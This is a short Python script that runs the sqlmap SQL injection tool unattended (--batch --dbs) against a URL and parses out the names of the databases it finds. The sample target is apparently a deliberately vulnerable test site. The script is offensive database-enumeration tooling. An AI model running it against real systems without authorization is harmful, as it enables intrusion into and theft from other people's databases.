import subprocess

def sqlmap_dbs(url):
    # Craft the command for SQLMap
    sqlmap_path = '/usr/bin/sqlmap'  # Example: '/usr/bin/sqlmap/sqlmap.py'

    # Command to run SQLMap with default options
    command = [sqlmap_path, '-u', url, '--batch', '--dbs']

    try:
        # Run the SQLMap command
        result = subprocess.run(command, capture_output=True, text=True, check=True)

        # Print the SQLMap output for debugging
        print(result.stdout)

        # Extract the database names from the SQLMap output
        output_lines = result.stdout.splitlines()

        # Find the line containing "available databases"
        start_index = output_lines.index(next(line for line in output_lines if "available databases" in line.lower()))

        # Extract database names from the subsequent lines
        database_names = [line.strip(' *') for line in output_lines[start_index + 1:]]

        return database_names
    except subprocess.CalledProcessError as e:
        raise Exception(f"Error running SQLMap: {e}")

if __name__ == "__main__":
    target_url = "http://testphp.vulnweb.com/listproducts.php?cat=1"

    try:
        database_names = sqlmap_dbs(target_url)

        if database_names:
            print("Available Databases:")
            for db_name in database_names:
                print(db_name)
        else:
            print("No databases found.")
    except Exception as e:
        print(f"Error: {e}")